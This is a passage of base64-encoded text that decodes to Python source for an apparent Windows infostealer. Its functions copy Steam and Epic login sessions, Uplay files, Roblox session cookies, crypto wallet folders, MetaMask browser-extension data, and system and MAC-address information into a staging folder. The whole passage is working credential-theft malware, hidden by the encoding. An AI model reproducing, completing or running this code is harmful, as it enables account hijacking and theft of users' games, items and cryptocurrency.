WYgb3MucGF0aC5pc2ZpbGUobG9naW5GaWxlKToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGxvZ2luRmlsZSkgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzID0gZmlsZS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ1tSZW1lbWJlck1lXScgaW4gY29udGVudHM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2F2ZVRvUGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKGVwaWNQYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUob3MucGF0aC5qb2luKGVwaWNQYXRoLCBmaWxlKSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weShvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXBpY1BhdGgsIGZpbGUpLCBvcy5wYXRoLmpvaW4oc2F2ZVRvUGF0aCwgZmlsZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHl0cmVlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcGljUGF0aCwgc2F2ZVRvUGF0aCwgZGlyc19leGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuRXBpY1N0b2xlbiA9IFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsU3RlYW0oc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZUdhbWVzOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1N0ZWFsaW5nIFN0ZWFtIHNlc3Npb24nKQogICAgICAgICAgICAgICAgc2F2ZVRvUGF0aCA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdHYW1lcycsICdTdGVhbScpCiAgICAgICAgICAgICAgICBzdGVhbVBhdGhzID0gWypzZXQoW29zLnBhdGguZGlybmFtZSh4KSBmb3IgeCBpbiBbVXRpbGl0eS5HZXRMbmtUYXJnZXQodikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdiBpbiBVdGlsaXR5LkdldExua0Zyb21TdGFydE1lbnUoJ1N0ZWFtJyldIGlmIHggaXMgbm90IE5vbmVdKV0KICAgICAgICAgICAgICAgIG11bHRpcGxlID0gbGVuKHN0ZWFtUGF0aHMpID4gMQogICAgICAgICAgICAgICAgaWYgbm90IHN0ZWFtUGF0aHM6CiAgICAgICAgICAgICAgICAgICAgc3RlYW1QYXRocy5hcHBlbmQoJ0M6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxTdGVhbScpCiAgICAgICAgICAgICAgICBmb3IgaW5kZXgsIHN0ZWFtUGF0aCBpbiBlbnVtZXJhdGUoc3RlYW1QYXRocyk6CiAgICAgICAgICAgICAgICAgICAgc3RlYW1Db25maWdQYXRoID0gb3MucGF0aC5qb2luKHN0ZWFtUGF0aCwgJ2NvbmZpZycpCiAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihzdGVhbUNvbmZpZ1BhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBsb2dpbkZpbGUgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGVhbUNvbmZpZ1BhdGgsICdsb2dpbnVzZXJzLnZkZicpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGxvZ2luRmlsZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4obG9naW5GaWxlKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzID0gZmlsZS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICciUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBjb250ZW50czoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9QYXRoID0gc2F2ZVRvUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBtdWx0aXBsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9QYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVUb1BhdGgsICdQcm9maWxlICVkJyAlIChpbmRleCArIDEpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhfc2F2ZVRvUGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHl0cmVlKHN0ZWFtQ29uZmlnUGF0aCwgb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb1BhdGgsICdjb25maWcnKSwgZGlyc19leGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaXRlbSBpbiBvcy5saXN0ZGlyKHN0ZWFtUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtLnN0YXJ0c3dpdGgoJ3NzZm4nKSBhbmQgb3MucGF0aC5pc2ZpbGUob3MucGF0aC5qb2luKHN0ZWFtUGF0aCwgaXRlbSkpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RlYW1QYXRoLCBpdGVtKSwgb3MucGF0aC5qb2luKF9zYXZlVG9QYXRoLCBpdGVtKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLlN0ZWFtU3RvbGVuID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHNlbGYuU3RlYW1TdG9sZW4gYW5kIG11bHRpcGxlOgogICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvUGF0aCwgJ0luZm8udHh0JyksICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdNdWx0aXBsZSBTdGVhbSBpbnN0YWxsYXRpb25zIGFyZSBmb3VuZCwgc28gdGhlIGZpbGVzIGZvciBlYWNoIG9mIHRoZW0gYXJlIHB1dCBpbiBkaWZmZXJlbnQgUHJvZmlsZXMnKQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsVXBsYXkoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZUdhbWVzOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1N0ZWFsaW5nIFVwbGF5IHNlc3Npb24nKQogICAgICAgICAgICAgICAgc2F2ZVRvUGF0aCA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdHYW1lcycsICdVcGxheScpCiAgICAgICAgICAgICAgICB1cGxheVBhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgb3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ1ViaXNvZnQgR2FtZSBMYXVuY2hlcicpCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHVwbGF5UGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGl0ZW0gaW4gb3MubGlzdGRpcih1cGxheVBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShvcy5wYXRoLmpvaW4odXBsYXlQYXRoLCBpdGVtKSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzYXZlVG9QYXRoLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkob3MucGF0aC5qb2luKHVwbGF5UGF0aCwgaXRlbSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4oc2F2ZVRvUGF0aCwgaXRlbSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLlVwbGF5U3RvbGVuID0gVHJ1ZQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsUm9ibG94Q29va2llcyhzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlR2FtZXM6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnU3RlYWxpbmcgUm9ibG94IGNvb2tpZXMnKQogICAgICAgICAgICAgICAgc2F2ZVRvRGlyID0gb3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ0dhbWVzJywgJ1JvYmxveCcpCiAgICAgICAgICAgICAgICBub3RlID0gJyMgVGhlIGNvb2tpZXMgZm91bmQgaW4gdGhpcyB0ZXh0IGZpbGUgaGF2ZSBub3QgYmVlbiB2ZXJpZmllZCBvbmxpbmUuIFxuIyBUaGVyZWZvcmUsIHRoZXJlIGlzIGEgcG9zc2liaWxpdHkgdGhhdCBzb21lIG9mIHRoZW0gbWF5IHdvcmssIHdoaWxlIG90aGVycyBtYXkgbm90LicKICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBbXQogICAgICAgICAgICAgICAgYnJvd3NlckNvb2tpZXMgPSAnXG4nLmpvaW4oc2VsZi5Db29raWVzKQogICAgICAgICAgICAgICAgZm9yIG1hdGNoIGluIHJlLmZpbmRhbGwoJ19cXHxXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXNcXC5cXHxfW0EtWjAtOV0rJywgYnJvd3NlckNvb2tpZXMpOgogICAgICAgICAgICAgICAgICAgIGNvb2tpZXMuYXBwZW5kKG1hdGNoKQogICAgICAgICAgICAgICAgb3V0cHV0ID0gbGlzdCgpCiAgICAgICAgICAgICAgICBmb3IgaXRlbSBpbiAoJ0hLQ1UnLCAnSEtMTScpOgogICAgICAgICAgICAgICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICAgICAgICAgJ3Bvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoIHt9OlNPRlRXQVJFXFxSb2Jsb3hcXFJvYmxveFN0dWRpb0Jyb3dzZXJcXHJvYmxveC5jb20gLU5hbWUgLlJPQkxPU0VDVVJJVFknLmZvcm1hdChpdGVtKSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgcHJvY2Vzcy5yZXR1cm5jb2RlOgogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQuYXBwZW5kKHByb2Nlc3Muc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpKQogICAgICAgICAgICAgICAgZm9yIG1hdGNoIGluIHJlLmZpbmRhbGwoJ19cXHxXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXNcXC5cXHxfW0EtWjAtOV0rJywgJ1xuJy5qb2luKG91dHB1dCkpOgogICAgICAgICAgICAgICAgICAgIGNvb2tpZXMuYXBwZW5kKG1hdGNoKQogICAgICAgICAgICAgICAgY29va2llcyA9IFsqc2V0KGNvb2tpZXMpXQogICAgICAgICAgICAgICAgaWYgY29va2llczoKICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzYXZlVG9EaXIsICdSb2Jsb3ggQ29va2llcy50eHQnKSwgJ3cnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKCd7fXt9e30nLmZvcm1hdChub3RlLCBzZWxmLlNlcGFyYXRvciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5TZXBhcmF0b3Iuam9pbihjb29raWVzKSkpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5Sb2Jsb3hDb29raWVzQ291bnQgKz0gbGVuKGNvb2tpZXMpCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgU3RlYWxXYWxsZXRzKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIGlmIFNldHRpbmdzLkNhcHR1cmVXYWxsZXRzOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1N0ZWFsaW5nIGNyeXB0byB3YWxsZXRzJykKICAgICAgICAgICAgICAgIHNhdmVUb0RpciA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdXYWxsZXRzJykKICAgICAgICAgICAgICAgIHdhbGxldHMgPSAoKCdaY2FzaCcsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ1pjYXNoJykpLCAoJ0FybW9yeScsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ0FybW9yeScpKSwgKCdCeXRlY29pbicsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ0J5dGVjb2luJykpLCAoJ0pheHgnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdhcHBkYXRhJyksICdjb20ubGliZXJ0eS5qYXh4JywgJ0luZGV4ZWREQicsICdmaWxlXzAuaW5kZXhlZGRiLmxldmVsZGInKSksICgnRXhvZHVzJywgb3MucGF0aC5qb2luKG9zLmdldGVudignYXBwZGF0YScpLCAnRXhvZHVzJywgJ2V4b2R1cy53YWxsZXQnKSksICgnRXRoZXJldW0nLCBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgb3MuZ2V0ZW52KCdhcHBkYXRhJyksICdFdGhlcmV1bScsICdrZXlzdG9yZScpKSwgKCdFbGVjdHJ1bScsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ0VsZWN0cnVtJywgJ3dhbGxldHMnKSksICgnQXRvbWljV2FsbGV0Jywgb3MucGF0aC5qb2luKG9zLmdldGVudignYXBwZGF0YScpLCAnYXRvbWljJywgJ0xvY2FsIFN0b3JhZ2UnLCAnbGV2ZWxkYicpKSwgKCdHdWFyZGEnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdhcHBkYXRhJyksICdHdWFyZGEnLCAnTG9jYWwgU3RvcmFnZScsICdsZXZlbGRiJykpLCAoJ0NvaW5vbWknLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ0NvaW5vbWknLCAnQ29pbm9taScsICd3YWxsZXRzJykpKQogICAgICAgICAgICAgICAgYnJvd3NlclBhdGhzID0geydCcmF2ZSc6IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnQnJhdmVTb2Z0d2FyZScsICdCcmF2ZS1Ccm93c2VyJywgJ1VzZXIgRGF0YScpLCAnQ2hyb21lJzogb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdHb29nbGUnLCAnQ2hyb21lJywgJ1VzZXIgRGF0YScpLCAnQ2hyb21pdW0nOiBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ0Nocm9taXVtJywgJ1VzZXIgRGF0YScpLCAnQ29tb2RvJzogb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdDb21vZG8nLCAnRHJhZ29uJywgJ1VzZXIgRGF0YScpLCAnRWRnZSc6IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnTWljcm9zb2Z0JywgJ0VkZ2UnLCAnVXNlciBEYXRhJyksICdFcGljUHJpdmFjeSc6IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnRXBpYyBQcml2YWN5IEJyb3dzZXInLCAnVXNlciBEYXRhJyksICdJcmlkaXVtJzogb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgIG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdJcmlkaXVtJywgJ1VzZXIgRGF0YScpLCAnT3BlcmEnOiBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdhcHBkYXRhJyksICdPcGVyYSBTb2Z0d2FyZScsICdPcGVyYSBTdGFibGUnKSwgJ09wZXJhIEdYJzogb3MucGF0aC5qb2luKG9zLmdldGVudignYXBwZGF0YScpLCAnT3BlcmEgU29mdHdhcmUnLCAnT3BlcmEgR1ggU3RhYmxlJyksICdTbGltamV0Jzogb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdTbGltamV0JywgJ1VzZXIgRGF0YScpLCAnVVInOiBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ1VSIEJyb3dzZXInLCAnVXNlciBEYXRhJyksICdWaXZhbGRpJzogb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdWaXZhbGRpJywgJ1VzZXIgRGF0YScpLCAnWWFuZGV4Jzogb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdZYW5kZXgnLCAnWWFuZGV4QnJvd3NlcicsICdVc2VyIERhdGEnKX0KICAgICAgICAgICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHdhbGxldHM6CiAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb0RpciA9IG9zLnBhdGguam9pbihzYXZlVG9EaXIsIG5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKF9zYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5dHJlZShwYXRoLCBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb0Rpciwgb3MucGF0aC5iYXNlbmFtZShwYXRoKSksIGRpcnNfZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oX3NhdmVUb0RpciwgJ0xvY2F0aW9uLnR4dCcpLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShwYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5XYWxsZXRzQ291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNodXRpbC5ybXRyZWUoX3NhdmVUb0RpcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gYnJvd3NlclBhdGhzLml0ZW1zKCk6CiAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIF8gaW4gb3Mud2FsayhwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfZGlyIGluIGRpcnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgX2RpciA9PSAnTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxFeHRlbnNpb25zU2V0dGluZ3NEaXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LCBfZGlyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgX2RpciBpbiAoJ2VqYmFsYmFrb3BsY2hsZ2hlY2RhbG1lZWVham5pbWhtJywgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbnRpb25QYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsRXh0ZW5zaW9uc1NldHRpbmdzRGlyLCBfZGlyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihleHRlbnRpb25QYXRoKSBhbmQgb3MubGlzdGRpcihleHRlbnRpb25QYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGFtYXNrX2Jyb3dzZXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYXZlVG9EaXIsICdNZXRhbWFzayAoe30pJy5mb3JtYXQobmFtZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9EaXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRhbWFza19icm93c2VyLCBfZGlyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weXRyZWUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbnRpb25QYXRoLCBfc2F2ZVRvRGlyLCBkaXJzX2V4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oX3NhdmVUb0RpciwgJ0xvY2F0aW9uLnR4dCcpLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGV4dGVudGlvblBhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuV2FsbGV0c0NvdW50ICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwucm10cmVlKF9zYXZlVG9EaXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MubGlzdGRpcihtZXRhbWFza19icm93c2VyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwucm10cmVlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRhbWFza19icm93c2VyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsU3lzdGVtSW5mbyhzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlU3lzdGVtSW5mbzoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdTdGVhbGluZyBzeXN0ZW0gaW5mb3JtYXRpb24nKQogICAgICAgICAgICAgICAgc2F2ZVRvRGlyID0gb3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ1N5c3RlbScpCiAgICAgICAgICAgICAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgICAgICAgICAgJ3N5c3RlbWluZm8nLCBjYXB0dXJlX291dHB1dD1UcnVlLCBzaGVsbD1UcnVlKQogICAgICAgICAgICAgICAgb3V0cHV0ID0gcHJvY2Vzcy5zdGRvdXQuZGVjb2RlKAogICAgICAgICAgICAgICAgICAgIGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5yZXBsYWNlKCdcclxuJywgJ1xuJykKICAgICAgICAgICAgICAgIGlmIG91dHB1dDoKICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzYXZlVG9EaXIsICdTeXN0ZW0gSW5mby50eHQnKSwgJ3cnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKG91dHB1dCkKICAgICAgICAgICAgICAgICAgICBzZWxmLlN5c3RlbUluZm9TdG9sZW4gPSBUcnVlCiAgICAgICAgICAgICAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgICAgICAgICAgJ2dldG1hYycsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpCiAgICAgICAgICAgICAgICBvdXRwdXQgPSBwcm9jZXNzLnN0ZG91dC5kZWNvZGUoCiAgICAgICAgICAgICAgICAgICAgZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpLnJlcGxhY2UoJ1xyXG4nLCAnXG4nKQogICAgICAgICAgICAgICAgaWYgb3V0cHV0OgogICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKHNhdmVUb0RpciwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNhdmVUb0RpciwgJ01BQyBBZGRyZXNzZXMudHh0JyksICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShvdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5TeXN0ZW1JbmZvU3RvbGVuID0gVHJ1ZQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIEdldERpcmVjdG9yeVRyZWUoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZVN5c3RlbUluZm86CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnR2V0dGluZyBkaXJlY3RvcnkgdHJlZXMnKQogICAgICAgICAgICAgICAgUElQRSA9IGNocig5NDc0KSArICcgICAnCiAgICAgICAgICAgICAgICBURUUgPSAnJy5qb2luKChjaHIoeCkgZm9yIHggaW4gKDk1MDAsIDk0NzIsIDk0NzIpKSkgKyAnICcKICAgICAgICAgICAgICAgIEVMQk9XID0gJycuam9pbigoY2hyKHgpIGZvciB4IGluICg5NDkyLCA5NDcyLCA5NDcyKSkpICsgJyAnCiAgICAgICAgICAgICAgICBvdXRwdXQgPSB7fQogICAgICAgICAgICAgICAgZm9yIG5hbWUsIGRpciBpbiAoKCdEZXNrdG